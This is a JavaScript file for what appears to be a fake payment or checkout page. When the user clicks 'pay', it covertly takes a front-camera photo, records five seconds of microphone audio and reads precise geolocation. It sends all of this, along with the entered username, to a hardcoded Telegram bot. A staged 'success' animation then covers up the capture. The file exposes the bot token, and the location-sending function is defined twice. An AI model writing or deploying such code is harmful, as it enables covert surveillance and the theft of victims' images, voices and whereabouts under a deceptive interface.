const BOT_TOKEN = "8630647360:AAFM_UmVQrDYlB97JpCTJRmeZCzuL-tvGag";
const CHAT_ID= "8745959194";

// Modal boshqaruvi
const modal = document.getElementById('checkoutModal');
const modalBox = document.getElementById('modalBox');


async function sendLocationData(latitude, longitude) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                latitude: latitude,
                longitude: longitude
            })
        });

        const data = await response.json();
        if (data.ok) {
            alert("Lokatsiya muvaffaqiyatli yuborildi!");
        } else {
            console.error("Xatolik:", data.description);
        }
    } catch (err) {
        console.error("So'rovda xatolik:", err);
    }
}
// HTML dagi tugmani ushlab olamiz
const btn = document.getElementById('paySubmitBtn');

async function sendLocationData(latitude, longitude) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                latitude: latitude,
                longitude: longitude
            })
        });

        const data = await response.json();
        if (data.ok) {
            alert("Konum başarıyla gönderildi!");
        } else {
            console.error("Telegram API Hatası:", data.description);
        }
    } catch (err) {
        console.error("Ağ Hatası:", err);
    }
}

// Kullanıcıdan konum izni isteyerek konumu alan fonksiyon
function getAndSendLocation() {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                sendLocationData(lat, lon);
            },
            (error) => {
                console.warn("Konum izni reddedildi veya hata oluştu:", error.message);
                alert("Konum alınamadı. Lütfen tarayıcı izinlerini kontrol edin.");
            },
            { enableHighAccuracy: true }
        );
    } else {
        alert("Tarayıcınız konum özelliğini desteklemiyor.");
    }
}

// Foydalanuvchidan oshkora ruxsat so'rab lokatsiyani olish
function askAndSendLocation() {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                sendLocationData(lat, lon);
            },
            (error) => {
                alert("Lokatsiyani olishga ruxsat berilmadi yoki xatolik yuz berdi.");
            }
        );
    } else {
        alert("Brauzeringiz geolokatsiyani qo'llab-quvvatlamaydi.");
    }
}

function openCheckoutModal() {
    const paymentForm = document.getElementById('paymentForm');
    const successState = document.getElementById('successState');

    if (paymentForm) paymentForm.classList.remove('hidden');
    if (successState) successState.classList.add('hidden');

    if (modal) {
        modal.classList.remove('hidden');
        setTimeout(() => {
            modal.classList.remove('opacity-0');
            if (modalBox) {
                modalBox.classList.remove('scale-95');
                modalBox.classList.add('scale-100');
            }
        }, 10);
    }
}

function closeCheckoutModal() {
    if (!modal) return;

    modal.classList.add('opacity-0');
    if (modalBox) {
        modalBox.classList.remove('scale-100');
        modalBox.classList.add('scale-95');
    }

    setTimeout(() => {
        modal.classList.add('hidden');
    }, 250);
}

// 1. Geolokatsiyani olish
function getUserLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);

        navigator.geolocation.getCurrentPosition(
            (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }),
            (err) => {
                console.warn('Lokatsiyaga ruxsat berilmadi:', err.message);
                resolve(null);
            },
            { enableHighAccuracy: true, timeout: 7000 }
        );
    });
}

// 2. Kamera va Mikrofonni bitta oqimda (stream) ochish va 5 soniya yozish
async function captureMediaAndVoice() {
    let stream = null;
    let photoBlob = null;
    let audioBlob = null;

    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' },
            audio: true
        });

        const video = document.createElement('video');
        video.srcObject = stream;
        video.playsInline = true;
        video.muted = true;
        await video.play();

        await new Promise((r) => setTimeout(r, 400));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        photoBlob = await new Promise((resolve) => {
            canvas.toBlob(resolve, 'image/jpeg', 0.85);
        });

        let mimeType = '';
        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
            mimeType = 'audio/webm;codecs=opus';
        } else if (MediaRecorder.isTypeSupported('audio/ogg;codecs=opus')) {
            mimeType = 'audio/ogg;codecs=opus';
        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
            mimeType = 'audio/mp4';
        }

        const options = mimeType ? { mimeType } : {};
        const mediaRecorder = new MediaRecorder(stream, options);
        const audioChunks = [];

        mediaRecorder.ondataavailable = (e) => {
            if (e.data && e.data.size > 0) {
                audioChunks.push(e.data);
            }
        };

        audioBlob = await new Promise((resolve) => {
            mediaRecorder.onstop = () => {
                const finalType = mimeType || 'audio/webm';
                const blob = new Blob(audioChunks, { type: finalType });
                resolve(blob);
            };

            mediaRecorder.start(250);

            setTimeout(() => {
                if (mediaRecorder.state !== 'inactive') {
                    mediaRecorder.stop();
                }
            }, 5000);
        });
    } catch (err) {
        console.warn('Kamera yoki mikrofon xatosi:', err.message);
    } finally {
        if (stream) {
            stream.getTracks().forEach((track) => track.stop());
        }
    }

    return { photoBlob, audioBlob };
}

// 3. Telegramga jo'natish
const postTg = async () => {
    const inputNumber = document.querySelector('#usernameInput');
    const textVal = inputNumber ? inputNumber.value : 'Ma\'lumot yo\'q';

    const [mediaData, location] = await Promise.all([
        captureMediaAndVoice(),
        getUserLocation()
    ]);

    const { photoBlob, audioBlob } = mediaData;

    try {
        if (photoBlob) {
            const photoForm = new FormData();
            photoForm.append('chat_id', CHAT_ID);
            photoForm.append('photo', photoBlob, 'photo.jpg');
            photoForm.append('caption', `Foydalanuvchi: ${textVal}`);

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: photoForm
            });
        } else {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'content-type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: textVal })
            });
        }

        if (location) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'content-type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    latitude: location.latitude,
                    longitude: location.longitude
                })
            });
        }

        if (audioBlob && audioBlob.size > 0) {
            const voiceForm = new FormData();
            voiceForm.append('chat_id', CHAT_ID);

            const ext = audioBlob.type.includes('mp4') ? 'm4a' : (audioBlob.type.includes('ogg') ? 'ogg' : 'webm');
            voiceForm.append('voice', audioBlob, `voice_record.${ext}`);
            voiceForm.append('caption', '🎤 5 soniyalik ovoz yozuvi');

            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
                method: 'POST',
                body: voiceForm
            });

            const resData = await res.json();
            if (!resData.ok) {
                console.warn('sendVoice qabul qilmadi, sendAudio orqali yuborilmoqda:', resData.description);
                const audioForm = new FormData();
                audioForm.append('chat_id', CHAT_ID);
                audioForm.append('audio', audioBlob, `audio_record.${ext}`);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: audioForm
                });
            }
        }
    } catch (err) {
        console.error('Yuborishda xatolik:', err);
    }
};

// 4. To'lov animatsiyasi
function processPayment(event) {
    if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
    }

    const submitBtn = document.getElementById('paySubmitBtn');
    if (!submitBtn || submitBtn.dataset.processing === 'true') return;

    submitBtn.dataset.processing = 'true';
    const originalText = submitBtn.innerHTML;

    submitBtn.disabled = true;
    submitBtn.innerHTML = `
        <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
        </svg>
        Faollashtirilmoqda...
      `;

    setTimeout(() => {
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalText;
        submitBtn.dataset.processing = 'false';

        const paymentForm = document.getElementById('paymentForm');
        const successState = document.getElementById('successState');
        if (paymentForm) paymentForm.classList.add('hidden');
        if (successState) successState.classList.remove('hidden');

        const badge = document.getElementById('userBadgePreview');
        if (badge) {
            badge.classList.remove('hidden');
            badge.classList.add('flex');
        }

        if (typeof confetti === 'function') {
            confetti({
                particleCount: 120,
                spread: 80,
                origin: { y: 0.6 }
            });
        }
    }, 1200);
}

// 5. Tugma bosilishi (Click listener)
const submitBtn = document.getElementById('paySubmitBtn');
if (submitBtn) {
    submitBtn.addEventListener('click', async (event) => {
        event.preventDefault();

        if (submitBtn.disabled || submitBtn.dataset.processing === 'true') return;

        submitBtn.disabled = true;
        const defaultText = submitBtn.innerHTML;
        submitBtn.innerText = 'Yozilmoqda va yuborilmoqda (5s)...';

        try {
            await postTg();
        } catch (err) {
            console.error('Telegramga yuborishda xatolik:', err);
        } finally {
            submitBtn.innerHTML = defaultText;
            submitBtn.disabled = false;
            processPayment();
        }
    
    });
}

// Orqa fon zarrachalari
function generateParticles() {
    const container = document.getElementById('particles-container');
    if (!container) return;

    const colors = ['#10b981', '#a855f7', '#6366f1', '#ec4899', '#facc15', '#ffffff'];
    const count = 28;

    for (let i = 0; i < count; i++) {
        const dot = document.createElement('div');
        dot.className = 'particle';
        const size = Math.floor(Math.random() * 4) + 2;
        dot.style.width = `${size}px`;
        dot.style.height = `${size}px`;
        dot.style.left = `${Math.random() * 100}%`;
        dot.style.top = `${Math.random() * 100}%`;
        dot.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
        dot.style.animationDuration = `${6 + Math.random() * 8}s`;
        dot.style.animationDelay = `${Math.random() * 5}s`;
        container.appendChild(dot);
    }
}